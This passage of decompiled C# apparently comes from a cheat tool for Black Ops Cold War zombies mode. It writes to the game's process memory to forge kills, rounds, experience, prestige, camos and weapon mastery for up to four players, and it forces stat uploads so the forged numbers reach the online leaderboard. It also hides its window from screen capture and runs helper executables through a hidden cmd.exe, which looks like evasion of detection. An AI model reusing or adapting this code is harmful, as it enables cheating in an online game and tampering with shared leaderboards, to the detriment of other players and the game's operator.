				this.SendIntStats(1, Main.StatsDDL_Stats.TotalRounds, Convert.ToInt32(this.thirteenTextBox6.Text));
				Thread.Sleep(500);
				this.label30.Text = "Status: Success!";
				return;
			}
			if (this.radioButton7.Checked)
			{
				this.SendIntStats(2, Main.StatsDDL_Stats.GamesPlayed, Convert.ToInt32(this.thirteenTextBox10.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.Kills1, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.Kills2, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.Kills3, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.KillsCritiq, Convert.ToInt32(this.thirteenTextBox8.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.KillsCritiq2, Convert.ToInt32(this.thirteenTextBox8.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.KillsElites, Convert.ToInt32(this.thirteenTextBox7.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.KillsElites2, Convert.ToInt32(this.thirteenTextBox7.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.MaxElimInGame, Convert.ToInt32(this.thirteenTextBox11.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.TimePlayed, Convert.ToInt32(this.thirteenTextBox12.Text));
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.TotalRounds, Convert.ToInt32(this.thirteenTextBox6.Text));
				Thread.Sleep(500);
				this.label30.Text = "Status: Success!";
				return;
			}
			if (this.radioButton8.Checked)
			{
				this.SendIntStats(3, Main.StatsDDL_Stats.GamesPlayed, Convert.ToInt32(this.thirteenTextBox10.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.Kills1, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.Kills2, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.Kills3, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.KillsCritiq, Convert.ToInt32(this.thirteenTextBox8.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.KillsCritiq2, Convert.ToInt32(this.thirteenTextBox8.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.KillsElites, Convert.ToInt32(this.thirteenTextBox7.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.KillsElites2, Convert.ToInt32(this.thirteenTextBox7.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.MaxElimInGame, Convert.ToInt32(this.thirteenTextBox11.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.TimePlayed, Convert.ToInt32(this.thirteenTextBox12.Text));
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.TotalRounds, Convert.ToInt32(this.thirteenTextBox6.Text));
				Thread.Sleep(500);
				this.label30.Text = "Status: Success!";
				return;
			}
			MessageBox.Show("Please select a client!");
		}

		// Token: 0x060002E7 RID: 743 RVA: 0x000154F4 File Offset: 0x000154F4
		private void linkLabel1_LinkClicked_1(object sender, LinkLabelLinkClickedEventArgs e)
		{
			MessageBox.Show("This is for zombies and NOT multiplayer. Do this in-game! For stats to stick, you must for instance, get a kill, down yourself, progress to the next round, kill an elite or whatever, as long as something changes in the stats you set. \n\n*All Stats will stick on leaderboard**");
		}

		// Token: 0x060002E8 RID: 744 RVA: 0x00005140 File Offset: 0x00005140
		private void groupBox7_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x060002E9 RID: 745 RVA: 0x00015504 File Offset: 0x00015504
		private void thirteenButton37_Click_2(object sender, EventArgs e)
		{
			this.thirteenTextBox6.Text = "47182";
			this.thirteenTextBox7.Text = "15018";
			this.thirteenTextBox9.Text = "172918";
			this.thirteenTextBox8.Text = "68172";
			this.thirteenTextBox11.Text = "2918";
			this.thirteenTextBox10.Text = "3912";
			this.thirteenTextBox12.Text = "1304640";
		}

		// Token: 0x060002EA RID: 746 RVA: 0x00015584 File Offset: 0x00015584
		private void thirteenButton38_Click_1(object sender, EventArgs e)
		{
			for (int i = 0; i < 4; i++)
			{
				this.SendIntStats(i, Main.StatsDDL_Stats.Crystals1Part1, 172);
				this.SendIntStats(i, Main.StatsDDL_Stats.Crystals1Part2, 114);
				this.SendIntStats(i, Main.StatsDDL_Stats.Crystals1Part3, 143);
			}
		}

		// Token: 0x060002EB RID: 747 RVA: 0x000155D0 File Offset: 0x000155D0
		private void thirteenButton40_Click_1(object sender, EventArgs e)
		{
			if (this.comboBox5.SelectedIndex == 0)
			{
				this.mem.WriteInt(this.mem.BaseAddress + 326449936L + (long)((ulong)Main.preGameStats.GlobalStats_Exp), Convert.ToInt32(this.thirteenTextBox14.Text));
				this.mem.WriteInt(this.mem.BaseAddress + 326449936L + (long)((ulong)Main.preGameStats.GlobalStats_Exp2), Convert.ToInt32(this.thirteenTextBox14.Text));
				this.sendCbuf("uploadstats");
				this.sendCbuf("updategamerprofile;uploadstats");
				this.sendCbuf("uploadstats");
				this.sendCbuf("updategamerprofile;uploadstats");
			}
			if (this.comboBox5.SelectedIndex == 1)
			{
				this.mem.WriteInt(this.mem.BaseAddress + 326449936L + (long)((ulong)Main.preGameStats.GlobalStats_Prestige), Convert.ToInt32(this.thirteenTextBox14.Text));
				this.mem.WriteInt(this.mem.BaseAddress + 326449936L + (long)((ulong)Main.preGameStats.GlobalStats_Prestige2), Convert.ToInt32(this.thirteenTextBox14.Text));
				this.mem.WriteInt(this.mem.BaseAddress + 326449936L + (long)((ulong)Main.preGameStats.GlobalStats_Prestige3), Convert.ToInt32(this.thirteenTextBox14.Text));
				this.sendCbuf("uploadstats");
				this.sendCbuf("updategamerprofile;uploadstats");
				this.sendCbuf("uploadstats");
				this.sendCbuf("updategamerprofile;uploadstats");
			}
		}

		// Token: 0x060002EC RID: 748 RVA: 0x0001575C File Offset: 0x0001575C
		private void thirteenButton48_Click_1(object sender, EventArgs e)
		{
			if (this.radioButton5.Checked)
			{
				if (this.comboBox6.SelectedIndex == 0)
				{
					this.SendIntStats(0, Main.StatsDDL_Stats.TotalRounds, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 1)
				{
					this.SendIntStats(0, Main.StatsDDL_Stats.Kills1, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(0, Main.StatsDDL_Stats.Kills2, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(0, Main.StatsDDL_Stats.Kills3, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 2)
				{
					this.SendIntStats(0, Main.StatsDDL_Stats.KillsElites, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(0, Main.StatsDDL_Stats.KillsElites2, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 3)
				{
					this.SendIntStats(0, Main.StatsDDL_Stats.KillsCritiq, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(0, Main.StatsDDL_Stats.KillsCritiq2, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 4)
				{
					this.SendIntStats(0, Main.StatsDDL_Stats.MaxElimInGame, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 5)
				{
					this.SendIntStats(0, Main.StatsDDL_Stats.GamesPlayed, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 6)
				{
					this.SendIntStats(0, Main.StatsDDL_Stats.TimePlayed, Convert.ToInt32(this.thirteenTextBox15.Text));
					return;
				}
			}
			else if (this.radioButton6.Checked)
			{
				if (this.comboBox6.SelectedIndex == 0)
				{
					this.SendIntStats(1, Main.StatsDDL_Stats.TotalRounds, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 1)
				{
					this.SendIntStats(1, Main.StatsDDL_Stats.Kills1, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(1, Main.StatsDDL_Stats.Kills2, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(1, Main.StatsDDL_Stats.Kills3, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 2)
				{
					this.SendIntStats(1, Main.StatsDDL_Stats.KillsElites, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(1, Main.StatsDDL_Stats.KillsElites2, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 3)
				{
					this.SendIntStats(1, Main.StatsDDL_Stats.KillsCritiq, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(1, Main.StatsDDL_Stats.KillsCritiq2, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 4)
				{
					this.SendIntStats(1, Main.StatsDDL_Stats.MaxElimInGame, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 5)
				{
					this.SendIntStats(1, Main.StatsDDL_Stats.GamesPlayed, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 6)
				{
					this.SendIntStats(1, Main.StatsDDL_Stats.TimePlayed, Convert.ToInt32(this.thirteenTextBox15.Text));
					return;
				}
			}
			else if (this.radioButton7.Checked)
			{
				if (this.comboBox6.SelectedIndex == 0)
				{
					this.SendIntStats(2, Main.StatsDDL_Stats.TotalRounds, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 1)
				{
					this.SendIntStats(2, Main.StatsDDL_Stats.Kills1, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(2, Main.StatsDDL_Stats.Kills2, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(2, Main.StatsDDL_Stats.Kills3, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 2)
				{
					this.SendIntStats(2, Main.StatsDDL_Stats.KillsElites, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(2, Main.StatsDDL_Stats.KillsElites2, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 3)
				{
					this.SendIntStats(2, Main.StatsDDL_Stats.KillsCritiq, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(2, Main.StatsDDL_Stats.KillsCritiq2, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 4)
				{
					this.SendIntStats(2, Main.StatsDDL_Stats.MaxElimInGame, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 5)
				{
					this.SendIntStats(2, Main.StatsDDL_Stats.GamesPlayed, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 6)
				{
					this.SendIntStats(2, Main.StatsDDL_Stats.TimePlayed, Convert.ToInt32(this.thirteenTextBox15.Text));
					return;
				}
			}
			else if (this.radioButton8.Checked)
			{
				if (this.comboBox6.SelectedIndex == 0)
				{
					this.SendIntStats(3, Main.StatsDDL_Stats.TotalRounds, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 1)
				{
					this.SendIntStats(3, Main.StatsDDL_Stats.Kills1, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(3, Main.StatsDDL_Stats.Kills2, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(3, Main.StatsDDL_Stats.Kills3, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 2)
				{
					this.SendIntStats(3, Main.StatsDDL_Stats.KillsElites, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(3, Main.StatsDDL_Stats.KillsElites2, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 3)
				{
					this.SendIntStats(3, Main.StatsDDL_Stats.KillsCritiq, Convert.ToInt32(this.thirteenTextBox15.Text));
					this.SendIntStats(3, Main.StatsDDL_Stats.KillsCritiq2, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 4)
				{
					this.SendIntStats(3, Main.StatsDDL_Stats.MaxElimInGame, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 5)
				{
					this.SendIntStats(3, Main.StatsDDL_Stats.GamesPlayed, Convert.ToInt32(this.thirteenTextBox15.Text));
				}
				if (this.comboBox6.SelectedIndex == 6)
				{
					this.SendIntStats(3, Main.StatsDDL_Stats.TimePlayed, Convert.ToInt32(this.thirteenTextBox15.Text));
					return;
				}
			}
			else
			{
				MessageBox.Show("Please select a client!");
			}
		}

		// Token: 0x060002ED RID: 749 RVA: 0x00015E18 File Offset: 0x00015E18
		private void thirteenButton49_Click_1(object sender, EventArgs e)
		{
			for (int i = 0; i < Main.camoweap1.Length; i++)
			{
				this.mem.WriteInt(Main.camoweap1[i], 0);
			}
			Thread.Sleep(10);
			for (int j = 0; j < Main.camoweap2.Length; j++)
			{
				this.mem.WriteInt(Main.camoweap2[j], 0);
			}
			Thread.Sleep(10);
			for (int k = 0; k < Main.camoweap3.Length; k++)
			{
				this.mem.WriteInt(Main.camoweap3[k], 0);
			}
			Thread.Sleep(10);
			for (int l = 0; l < Main.camoweap4.Length; l++)
			{
				this.mem.WriteByte(Main.camoweap4[l], 0);
			}
			Thread.Sleep(10);
			for (int m = 0; m < Main.camoweap5.Length; m++)
			{
				this.mem.WriteByte(Main.camoweap5[m], 0);
			}
			Thread.Sleep(10);
			for (int n = 0; n < Main.camoweap6.Length; n++)
			{
				this.mem.WriteByte(Main.camoweap6[n], 0);
			}
			Thread.Sleep(10);
			for (int num = 0; num < Main.camoweap7.Length; num++)
			{
				this.mem.WriteByte(Main.camoweap7[num], 0);
			}
			Thread.Sleep(10);
			for (int num2 = 0; num2 < Main.camogoldall.Length; num2++)
			{
				this.mem.WriteByte(Main.camogoldall[num2], 0);
			}
			Thread.Sleep(10);
			for (int num3 = 0; num3 < Main.camogoldall2.Length; num3++)
			{
				this.mem.WriteByte(Main.camogoldall2[num3], 0);
			}
			Thread.Sleep(10);
			for (int num4 = 0; num4 < Main.masteryarray1.Length; num4++)
			{
				this.mem.WriteInt(Main.masteryarray1[num4], 4999);
			}
			Thread.Sleep(10);
			for (int num5 = 0; num5 < Main.masteryarray2.Length; num5++)
			{
				this.mem.WriteInt(Main.masteryarray2[num5], 4999);
			}
			Thread.Sleep(10);
			for (int num6 = 0; num6 < Main.masteryarray3.Length; num6++)
			{
				this.mem.WriteInt(Main.masteryarray3[num6], 9999);
			}
			Thread.Sleep(10);
			for (int num7 = 0; num7 < Main.masteryarray4.Length; num7++)
			{
				this.mem.WriteInt(Main.masteryarray4[num7], 9999);
			}
			Thread.Sleep(10);
		}

		// Token: 0x060002EE RID: 750 RVA: 0x000160A0 File Offset: 0x000160A0
		private void thirteenButton49_Click_2(object sender, EventArgs e)
		{
			long num = this.mem.ReadInt64(this.mem.BaseAddress + this.fastRun);
			long num2 = 137598L;
			for (long num3 = 0L; num3 < 3L; num3 += 1L)
			{
				for (int i = 0; i < this.Field32.Count; i++)
				{
					long num4 = num + num2 * num3 + this.Field32.ElementAt(i).Value;
					this.mem.WriteInt(num4, 2499);
					this.mem.WriteInt(num4 + 9L, 2499);
					this.mem.WriteInt(num4 + 18L, 2499);
					this.mem.WriteByte(num4 + 28L, byte.MaxValue);
					this.mem.WriteByte(num4 + 29L, byte.MaxValue);
					this.mem.WriteByte(num4 + 40L, byte.MaxValue);
					this.mem.WriteByte(num4 + 54L, byte.MaxValue);
					this.mem.WriteByte(num4 + 65L, byte.MaxValue);
					this.mem.WriteByte(num4 + 82L, byte.MaxValue);
				}
			}
		}

		// Token: 0x060002EF RID: 751 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton50_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060002F0 RID: 752 RVA: 0x000161E2 File Offset: 0x000161E2
		private void backgroundWorker4_DoWork_1(object sender, DoWorkEventArgs e)
		{
			for (;;)
			{
				Thread.Sleep(5000);
				if (Process.GetProcessesByName("Assets2").Length == 0)
				{
					Process.GetCurrentProcess().Kill();
				}
			}
		}

		// Token: 0x060002F1 RID: 753 RVA: 0x00016208 File Offset: 0x00016208
		private void Main_FormClosing(object sender, FormClosingEventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("cmd");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Assets2");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}

		// Token: 0x060002F2 RID: 754 RVA: 0x00016258 File Offset: 0x00016258
		private void thirteenButton51_Click(object sender, EventArgs e)
		{
			if (!File.Exists("Assets1.exe"))
			{
				MessageBox.Show("Missing Assets1.exe File, The Tool Requires This To Run!");
				Process.GetCurrentProcess().Kill();
			}
			if (!File.Exists("Assets2.exe"))
			{
				MessageBox.Show("Missing Assets2.exe File, The Tool Requires This To Run!");
				Process.GetCurrentProcess().Kill();
			}
			Process[] processesByName = Process.GetProcessesByName("Assets2");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			int id = Process.GetCurrentProcess().Id;
			Directory.GetCurrentDirectory();
			string text = "Assets1.exe";
			string text2 = "Assets2.exe";
			Main.ExecuteCommand(string.Concat(new string[]
			{
				text,
				" ",
				text2,
				" ",
				id.ToString()
			}));
			Thread.Sleep(5000);
			this.backgroundWorker4.RunWorkerAsync();
		}

		// Token: 0x060002F3 RID: 755 RVA: 0x00016334 File Offset: 0x00016334
		public static void ExecuteCommand(string command)
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.Arguments = "/c " + command;
			process.StartInfo.RedirectStandardOutput = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
			process.StartInfo.Verb = "runas";
			process.StartInfo = processStartInfo;
			process.Start();
		}

		// Token: 0x060002F4 RID: 756 RVA: 0x000163B8 File Offset: 0x000163B8
		private void checkBox14_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox14.Checked)
			{
				Main.SetWindowDisplayAffinity(base.Handle, 1U);
				this.label35.Visible = true;
				return;
			}
			Main.SetWindowDisplayAffinity(base.Handle, 0U);
			this.label35.Visible = false;
		}

		// Token: 0x060002F5 RID: 757 RVA: 0x00005140 File Offset: 0x00005140
		private void label5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x04000137 RID: 311
		private Memory mem = new Memory();

		// Token: 0x04000138 RID: 312
		public string TargetProcessName = "BlackOpsColdWar";

		// Token: 0x04000139 RID: 313
		public float[] TeleportPos = new float[3];

		// Token: 0x0400013A RID: 314
		public float[] boxPos = new float[3];

		// Token: 0x0400013B RID: 315
		public float[] myPos = new float[3];

		// Token: 0x0400013C RID: 316
		public float[] clientPos = new float[3];

		// Token: 0x0400013D RID: 317
		private long moneyPTR = 23844L;

		// Token: 0x0400013E RID: 318
		private long speedLong = 23664L;

		// Token: 0x0400013F RID: 319
		private long timescaleLong;

		// Token: 0x04000140 RID: 320
		private long namePTR = 23578L;

		// Token: 0x04000141 RID: 321
		private long onlineOffset;

		// Token: 0x04000142 RID: 322
		private long gEntityOffset;

		// Token: 0x04000143 RID: 323
		private long gClientOffset;

		// Token: 0x04000144 RID: 324
		private long cbufOffset;

		// Token: 0x04000145 RID: 325
		private long cbufOffset2;

		// Token: 0x04000146 RID: 326
		private long jumpOffset;

		// Token: 0x04000147 RID: 327
		private long weapon;

		// Token: 0x04000148 RID: 328
		private long xp;

		// Token: 0x04000149 RID: 329
		private long fastRun;

		// Token: 0x0400014A RID: 330
		private long weaponSkin = 200L;

		// Token: 0x0400014B RID: 331
		public bool giveAll;

		// Token: 0x0400014C RID: 332
		public float[] DogPos = new float[3];

		// Token: 0x0400014D RID: 333
		public long PlayerCompPtr;

		// Token: 0x0400014E RID: 334
		public long ZmBotBase;

		// Token: 0x0400014F RID: 335
		public long ZmBotListBase;

		// Token: 0x04000150 RID: 336
		private string myIPPP;

		// Token: 0x04000151 RID: 337
		public float[] testPos = new float[3];

		// Token: 0x04000152 RID: 338
		public long killPtr = 23880L;

		// Token: 0x04000153 RID: 339
		public static long skipround1;

		// Token: 0x04000154 RID: 340
		public long mastery1;

		// Token: 0x04000155 RID: 341
		public long mastery2;

		// Token: 0x04000156 RID: 342
		public long mastery3;

		// Token: 0x04000157 RID: 343
		public long mastery4;

		// Token: 0x04000158 RID: 344
		public long p2mastery1;

		// Token: 0x04000159 RID: 345
		public long p2mastery2;

		// Token: 0x0400015A RID: 346
		public long p2mastery3;

		// Token: 0x0400015B RID: 347
		public long p2mastery4;

		// Token: 0x0400015C RID: 348
		public long p3mastery1;

		// Token: 0x0400015D RID: 349
		public long p3mastery2;

		// Token: 0x0400015E RID: 350
		public long p3mastery3;

		// Token: 0x0400015F RID: 351
		public long p3mastery4;

		// Token: 0x04000160 RID: 352
		public long p4mastery1;

		// Token: 0x04000161 RID: 353
		public long p4mastery2;

		// Token: 0x04000162 RID: 354
		public long p4mastery3;

		// Token: 0x04000163 RID: 355
		public long p4mastery4;

		// Token: 0x04000164 RID: 356
		private bool PointerCheck;

		// Token: 0x04000165 RID: 357
		public static long p1camopointers;

		// Token: 0x04000166 RID: 358
		public static long[] camoweap1 = new long[150];

		// Token: 0x04000167 RID: 359
		public static long[] camoweap2 = new long[150];

		// Token: 0x04000168 RID: 360
		public static long[] camoweap3 = new long[150];

		// Token: 0x04000169 RID: 361
		public static long[] camoweap4 = new long[150];

		// Token: 0x0400016A RID: 362
		public static long[] camoweap5 = new long[150];

		// Token: 0x0400016B RID: 363
		public static long[] camoweap6 = new long[150];

		// Token: 0x0400016C RID: 364
		public static long[] camoweap7 = new long[150];

		// Token: 0x0400016D RID: 365
		public static long[] camogoldall = new long[150];

		// Token: 0x0400016E RID: 366
		public static long[] camogoldall2 = new long[150];

		// Token: 0x0400016F RID: 367
		public static long[] masteryarray1 = new long[150];

		// Token: 0x04000170 RID: 368
		public static long[] masteryarray2 = new long[150];

		// Token: 0x04000171 RID: 369
		public static long[] masteryarray3 = new long[150];

		// Token: 0x04000172 RID: 370
		public static long[] masteryarray4 = new long[150];

		// Token: 0x04000173 RID: 371
		public static long[] p2masteryarray1 = new long[150];

		// Token: 0x04000174 RID: 372
		public static long[] p2masteryarray2 = new long[150];

		// Token: 0x04000175 RID: 373
		public static long[] p2masteryarray3 = new long[150];

		// Token: 0x04000176 RID: 374
		public static long[] p2masteryarray4 = new long[150];

		// Token: 0x04000177 RID: 375
		public static long[] p3masteryarray1 = new long[150];

		// Token: 0x04000178 RID: 376
		public static long[] p3masteryarray2 = new long[150];

		// Token: 0x04000179 RID: 377
		public static long[] p3masteryarray3 = new long[150];

		// Token: 0x0400017A RID: 378
		public static long[] p3masteryarray4 = new long[150];

		// Token: 0x0400017B RID: 379
		public static long[] p4masteryarray1 = new long[150];

		// Token: 0x0400017C RID: 380
		public static long[] p4masteryarray2 = new long[150];

		// Token: 0x0400017D RID: 381
		public static long[] p4masteryarray3 = new long[150];

		// Token: 0x0400017E RID: 382
		public static long[] p4masteryarray4 = new long[150];

		// Token: 0x0400017F RID: 383
		public long camo2;

		// Token: 0x04000180 RID: 384
		public long camo3;

		// Token: 0x04000181 RID: 385
		public long camo4;

		// Token: 0x04000182 RID: 386
		public long camo5;

		// Token: 0x04000183 RID: 387
		public long camo6;

		// Token: 0x04000184 RID: 388
		public long camo7;

		// Token: 0x04000185 RID: 389
		public long camogold;

		// Token: 0x04000186 RID: 390
		public long camogold2;

		// Token: 0x04000187 RID: 391
		public static long p2camopointers;

		// Token: 0x04000188 RID: 392
		public static long[] p2camoweap1 = new long[150];

		// Token: 0x04000189 RID: 393
		public static long[] p2camoweap2 = new long[150];

		// Token: 0x0400018A RID: 394
		public static long[] p2camoweap3 = new long[150];

		// Token: 0x0400018B RID: 395
		public static long[] p2camoweap4 = new long[150];

		// Token: 0x0400018C RID: 396
		public static long[] p2camoweap5 = new long[150];

		// Token: 0x0400018D RID: 397
		public static long[] p2camoweap6 = new long[150];

		// Token: 0x0400018E RID: 398
		public static long[] p2camoweap7 = new long[150];

		// Token: 0x0400018F RID: 399
		public static long[] p2camogoldall = new long[150];

		// Token: 0x04000190 RID: 400
		public static long[] p2camogoldall2 = new long[150];

		// Token: 0x04000191 RID: 401
		public long p2camo2;

		// Token: 0x04000192 RID: 402
		public long p2camo3;

		// Token: 0x04000193 RID: 403
		public long p2camo4;

		// Token: 0x04000194 RID: 404
		public long p2camo5;

		// Token: 0x04000195 RID: 405
		public long p2camo6;

		// Token: 0x04000196 RID: 406
		public long p2camo7;

		// Token: 0x04000197 RID: 407
		public long p2camogold;

		// Token: 0x04000198 RID: 408
		public long p2camogold2;

		// Token: 0x04000199 RID: 409
		public static long p3camopointers;

		// Token: 0x0400019A RID: 410
		public static long[] p3camoweap1 = new long[150];

		// Token: 0x0400019B RID: 411
		public static long[] p3camoweap2 = new long[150];

		// Token: 0x0400019C RID: 412
		public static long[] p3camoweap3 = new long[150];

		// Token: 0x0400019D RID: 413
		public static long[] p3camoweap4 = new long[150];

		// Token: 0x0400019E RID: 414
		public static long[] p3camoweap5 = new long[150];

		// Token: 0x0400019F RID: 415
		public static long[] p3camoweap6 = new long[150];

		// Token: 0x040001A0 RID: 416
		public static long[] p3camoweap7 = new long[150];

		// Token: 0x040001A1 RID: 417
		public static long[] p3camogoldall = new long[150];

		// Token: 0x040001A2 RID: 418
		public static long[] p3camogoldall2 = new long[150];

		// Token: 0x040001A3 RID: 419
		public long p3camo2;

		// Token: 0x040001A4 RID: 420
		public long p3camo3;

		// Token: 0x040001A5 RID: 421
		public long p3camo4;

		// Token: 0x040001A6 RID: 422
		public long p3camo5;

		// Token: 0x040001A7 RID: 423
		public long p3camo6;

		// Token: 0x040001A8 RID: 424
		public long p3camo7;

		// Token: 0x040001A9 RID: 425
		public long p3camogold;

		// Token: 0x040001AA RID: 426
		public long p3camogold2;

		// Token: 0x040001AB RID: 427
		public static long p4camopointers;

		// Token: 0x040001AC RID: 428
		public static long[] p4camoweap1 = new long[150];

		// Token: 0x040001AD RID: 429
		public static long[] p4camoweap2 = new long[150];

		// Token: 0x040001AE RID: 430
		public static long[] p4camoweap3 = new long[150];

		// Token: 0x040001AF RID: 431
		public static long[] p4camoweap4 = new long[150];

		// Token: 0x040001B0 RID: 432
		public static long[] p4camoweap5 = new long[150];

		// Token: 0x040001B1 RID: 433
		public static long[] p4camoweap6 = new long[150];

		// Token: 0x040001B2 RID: 434
		public static long[] p4camoweap7 = new long[150];

		// Token: 0x040001B3 RID: 435
		public static long[] p4camogoldall = new long[150];

		// Token: 0x040001B4 RID: 436
		public static long[] p4camogoldall2 = new long[150];

		// Token: 0x040001B5 RID: 437
		public long p4camo2;

		// Token: 0x040001B6 RID: 438
		public long p4camo3;

		// Token: 0x040001B7 RID: 439
		public long p4camo4;

		// Token: 0x040001B8 RID: 440
		public long p4camo5;

		// Token: 0x040001B9 RID: 441
		public long p4camo6;

		// Token: 0x040001BA RID: 442
		public long p4camo7;

		// Token: 0x040001BB RID: 443
		public long p4camogold;

		// Token: 0x040001BC RID: 444
		public long p4camogold2;

		// Token: 0x040001BD RID: 445
		public static string WeaponXM4 = "57";

		// Token: 0x040001BE RID: 446
		public static string WeaponXM4PAP = "291";

		// Token: 0x040001BF RID: 447
		public static string WeaponAK47 = "6";

		// Token: 0x040001C0 RID: 448
		public static string WeaponAK47PAP = "301";

		// Token: 0x040001C1 RID: 449
		public static string WeaponKrig6 = "13";

		// Token: 0x040001C2 RID: 450
		public static string WeaponKrig6PAP = "277";

		// Token: 0x040001C3 RID: 451
		public static string WeaponQBZ83 = "54";

		// Token: 0x040001C4 RID: 452
		public static string WeaponQBZ83PAP = "302";

		// Token: 0x040001C5 RID: 453
		public static string WeaponFFAR1 = "32";

		// Token: 0x040001C6 RID: 454
		public static string WeaponFFAR1PAP = "304";

		// Token: 0x040001C7 RID: 455
		public static string WeaponGroza = "53";

		// Token: 0x040001C8 RID: 456
		public static string WeaponGrozaPAP = "334";

		// Token: 0x040001C9 RID: 457
		public static string WeaponMP5 = "44";

		// Token: 0x040001CA RID: 458
		public static string WeaponMP5PAP = "361";

		// Token: 0x040001CB RID: 459
		public static string WeaponMilano821 = "62";

		// Token: 0x040001CC RID: 460
		public static string WeaponMilano821PAP = "352";

		// Token: 0x040001CD RID: 461
		public static string WeaponAk74u = "47";

		// Token: 0x040001CE RID: 462
		public static string WeaponAk74uPAP = "386";

		// Token: 0x040001CF RID: 463
